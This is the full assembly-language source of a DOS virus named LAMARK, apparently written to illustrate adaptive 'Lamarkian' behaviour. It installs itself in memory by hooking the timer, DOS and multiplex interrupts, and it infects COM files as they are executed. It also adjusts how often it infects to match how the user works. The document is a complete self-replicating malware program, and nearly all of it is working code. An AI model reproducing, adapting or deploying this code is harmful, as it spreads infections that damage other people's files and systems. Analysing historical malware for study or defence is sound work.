;The LAMARK Virus -- To demonstrate Lamarkian evolution.


        .model  small

        .code

        ORG     100H

;Beginning of the virus code
VIRUS:
        mov     ax,0D827H               ;check for presence of the virus
        int     2FH                     ;in memory
        cmp     al,23H                  ;returns 23H if it's there
        jne     LOAD_VIRUS              ;virus not there, go load it
        jmp     LOAD_HOST               ;already there, go execute the host

        db      'Lamarkian evolution'

LOAD_VIRUS:
        mov     WORD PTR ds:[TRIGGER_OVER],0    ;set up trigger variables
        mov     ax,WORD PTR ds:[TRIGGER_SET]
        mov     WORD PTR ds:[TRIGGER],ax

        mov     ax,351CH                ;get interrupt vector 1C (timer)
        int     21H
        mov     WORD PTR ds:[OLD_1C],bx
        mov     bx,es
        mov     WORD PTR ds:[OLD_1C+2],bx       ;save old vector here

        mov     dx,OFFSET INT_1C        ;now set up new vector
        mov     ax,251CH
        int     21H

        mov     ax,352FH                ;get interrupt vector 2F (multiplex)
        int     21H
        mov     WORD PTR ds:[OLD_2F],bx
        mov     bx,es
        mov     WORD PTR ds:[OLD_2F+2],bx       ;save old vector here
        push    ds
        pop     es                      ;restore es

        mov     dx,OFFSET INT_2F        ;now set up new vector
        mov     ax,252FH
        int     21H

        mov     ax,3521H                ;get interrupt vector 21 (DOS)
        int     21H
        mov     WORD PTR ds:[OLD_21],bx
        mov     bx,es
        mov     WORD PTR ds:[OLD_21+2],bx       ;save old vector here
        push    ds
        pop     es                      ;restore es

        mov     dx,OFFSET INT_21        ;now set up new vector
        mov     ax,2521H
        int     21H

        mov     ax,ds:[TRIGGER_SET]     ;set the trigger now
        mov     ds:[TRIGGER],ax

        mov     sp,100H                 ;move stack pointer down
        mov     bx,OFFSET HOST          ;dx=size of virus + psp
        mov     cl,4
        shr     bx,cl                   ;dx=paragraphs of memory to keep
        inc     bx
        mov     ah,4AH
        int     21H                     ;decrease memory size to what's needed

        mov     bx,2CH
        mov     ax,[bx]                 ;get environment segment
        mov     ds:[EXEC],ax            ;save it here
        mov     es,ax                   ;environment in es
        mov     ax,ds
        mov     WORD PTR ds:[EXEC+2],82H
        mov     WORD PTR ds:[EXEC+4],ax         ;save pointer to command line
        mov     WORD PTR ds:[EXEC+6],5CH
        mov     WORD PTR ds:[EXEC+8],ax         ;set up FCB pointers for exec
        mov     WORD PTR ds:[EXEC+10],6CH
        mov     WORD PTR ds:[EXEC+12],ax
        mov     si,0                    ;now scan environment for this file's name
EL:     mov     ax,es:[si]              ;get a word from the environment
        or      ax,ax                   ;is it 0?
        jz      ELE                     ;yes, we're at end of environment string
        inc     si                      ;else inc pointer
        jmp     EL                      ;and continue search
ELE:    add     si,4                    ;now si points to program name string
        push    es                      ;exchange ds and es
        push    ds
        pop     es
        pop     ds
        mov     dx,si                   ;ds:dx points to file name to exec
        mov     bx,OFFSET EXEC          ;es:bx points to the EXEC data block
        mov     BYTE PTR es:[IN_INFECT],1       ;don't allow recursion here!
        mov     ax,4B00H
        int     21H                             ;EXEC the program
        mov     BYTE PTR es:[IN_INFECT],0

        mov     dx,OFFSET HOST          ;dx=size of virus + psp
        mov     cl,4
        shr     dx,cl                   ;dx=paragraphs to KEEP
        inc     dx
        mov     ax,3100H                ;terminate and stay resident
        int     21H


;This is the interrupt 1C (timer) handler for the virus. It is responsible
;for invoking the infection routine for the virus. This part of the virus
;implements Lamarkian evolution by trying to adjust TRIGGER_SET to the
;user's habits. The TRIGGER timer is initially set to TRIGGER_SET, and then
;decremented by this routine. When it is decremented to 0, the routine begins
;to increment TRIGGER_OVER. Every 32 increments, it also increments TRIGGER_SET.
;This has the effect that the trigger time will get longer if the user does
;not execute programs every TRIGGER_SET clock ticks. This is Lamarkian because
;the parent and child always have the same TRIGGER_SET at the time of
;reproduction. TRIGGER_SET does vary from generation to generation, though,
;because it varies in the parent.
INT_1C:
        push    ds
        push    cs
        pop     ds
        push    bx
        cmp     BYTE PTR ds:[IN_INFECT],1
        jz      I1CE
        cmp     WORD PTR ds:[TRIGGER],0 ;get trigger counter
        jz      I1C_05                  ;zero, don't decrement it
        dec     WORD PTR cs:[TRIGGER]   ;else decrement
        jmp     I1CE                    ;and exit
I1C_05: inc     WORD PTR ds:[TRIGGER_OVER]
        mov     bx,WORD PTR ds:[TRIGGER_OVER]
        and     bl,1FH                  ;is overflow a multiple of 32?
        jnz     I1CE                            ;nope, just exit
        cmp     WORD PTR cs:[TRIGGER_SET],0FFFFH;don't increment this too far!
        je      I1CE
        inc     WORD PTR cs:[TRIGGER_SET]       ;ok, increment TRIGGER_SET
I1CE:   pop     bx                      ;and exit our 1C handler
        pop     ds
        jmp     DWORD PTR cs:[OLD_1C]   ;pass control to old routine


;This is the interrupt 21 (DOS) handler for the virus. It traps the EXEC
;function and causes the virus to infect the file which is to be executed.
;This implements Lamarkian evolution in the other direction from INT_1C. It
;decrements TRIGGER_SET if TRIGGER_OVER is less than 32 - at least until
;TRIGGER_SET gets as small as 18 (eg one per second). This routine in
;conjunction with INT_1C allows TRIGGER_SET to increase or decrease and
;adjust to the user's habits.
INT_21:
        cmp     ax,4B00H                ;is it an EXEC call, subfunction 0?
        jne     I21E                    ;nope, just exit
        cmp     BYTE PTR cs:[IN_INFECT],1
        je      I21E                    ;no recursivity allowed
        push    bx
        mov     bx,cs:[TRIGGER]
        or      bx,bx
        jnz     I21_02
        mov     BYTE PTR cs:[IN_INFECT],1
        call    INFECT_FILE
        mov     bx,cs:[TRIGGER_SET]
        mov     cs:[TRIGGER],bx
I21_02: cmp     WORD PTR cs:[TRIGGER_OVER],32
        jge     I21_05
        cmp     WORD PTR cs:[TRIGGER_SET],18
        jle     I21_05
        dec     WORD PTR cs:[TRIGGER_SET]
I21_05: mov     WORD PTR cs:[TRIGGER_OVER],0
        mov     BYTE PTR cs:[IN_INFECT],0
I21E1:  pop     bx
I21E:   jmp     DWORD PTR cs:[OLD_21]   ;go to original handler

;This is the interrupt 2F (multiplex) handler for the virus. Its job is to tell
;the virus that it is already in memory, when the virus first starts executing.
INT_2F:
        cmp     ax,0D827H               ;identifier D827?
        jnz     I2FE                    ;no, pass control on to next in chain
        mov     al,23H                  ;yes, set al=23H
        iret                            ;and exit

I2FE:   jmp     DWORD PTR cs:[OLD_2F]   ;pass control down the chain

;This routine infects a COM file in the current directory.
INFECT_FILE:
        push    ax
        push    cx
        push    dx
        push    si
        push    di
        push    es

        mov     si,dx                   ;now see if we're looking at a COM file
IF_05:  lodsb
        or      al,al
        jz      IF_RET
        cmp     al,'.'                  ;find extent
        jne     IF_05
        lodsw
        or      ax,2020H
        cmp     al,'c'
        jne     IF_RET
        cmp     ah,'o'
        jne     IF_RET
        lodsb
        or      al,20H
        cmp     al,'m'
        jne     IF_RET                  ;if we get past this, it's a COM file

        mov     ah,48H                  ;allocate memory to read file
        mov     bx,1000H                ;--a 64K block
        int     21H
        jc      IF_RET                  ;exit if error
        mov     es,ax

        mov     ax,3D02H                ;open the file read/write
        int     21H
        jc      IF_RET                  ;exit now if error
        mov     bx,ax                   ;file handle to bx

        push    ds
        push    cs
        pop     ds
        mov     si,OFFSET VIRUS         ;move virus to memory buffer
        xor     di,di
        mov     cx,OFFSET HOST - OFFSET VIRUS
        rep     movsb

        push    es
        pop     ds
        mov     dx,di
        mov     cx,0FFFFH
        mov     ah,3FH                  ;read host into buffer
        int     21H
        jc      IF_10
        cmp     es:[di+1],0D827H        ;see if already infected
        je      IF_10                   ;yes, don't re-infect
        push    ax

        mov     ax,4200H                ;reset file pointer to start of file
        xor     cx,cx
        xor     dx,dx
        int     21H

        pop     cx
        add     cx,di
        mov     dx,0
        mov     ah,40H                  ;write infected file back to disk
        int     21H

IF_10:  pop     ds
        mov     ah,3EH                  ;close file
        int     21H
        mov     ah,49H                  ;release memory
        int     21H

IF_RET: pop     es
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     ax
        ret

;The following are all data for use by the virus

TRIGGER         DW      ?               ;dynamic timer trigger, decremented to 0 by INT_1C
TRIGGER_SET     DW      90              ;set value for trigger, modified by lamarkian means
TRIGGER_OVER    DW      0               ;trigger overflow counter
OLD_1C          DD      ?               ;old interrupt 1C vector
OLD_21          DD      ?               ;old interrutp 21 vector
OLD_2F          DD      ?               ;old interrupt 2F vector
IN_INFECT       DB      0               ;flag to indicate in infect routine
EXEC            DW      14 dup (?)      ;parameter block for EXEC function (DOS 4B)

;LOAD_HOST moves the host program down to offset 100H and executes it. This
;is accomplished by (a) putting the return address 100H on the stack, and then
;putting the instructions:
;                               rep     movsb
;                               ret
;
;just below the stack. These are executed with si, di and cx properly set up.
;Then control is transfered to these instructions via a ret instruction.
LOAD_HOST:
        mov     si,OFFSET HOST          ;prep to move host from HOST
        mov     di,0FCH                 ;to 100H
        push    di                      ;save this on stack for return
        mov     cx,sp
        sub     cx,OFFSET HOST + 100H
        mov     ax,0A4F3H               ;rep movsb instruction
        stosw
        mov     ax,00EBH                ;jmp 100H instruction to clear
        stosw                           ;386 instruction cache
        ret                             ;jump to 00FEH to do rep movsb


;The following is a dummy host to get the virus to attach to.

HOST:
        mov     dx,OFFSET LOADING - OFFSET HOST + 100H  ;display a message
        mov     ah,9
        int     21H
        mov     ax,4C00H                                ;terminate program
        int     21H

LOADING DB      'Loading LAMARK virus!$'

        END     VIRUS
        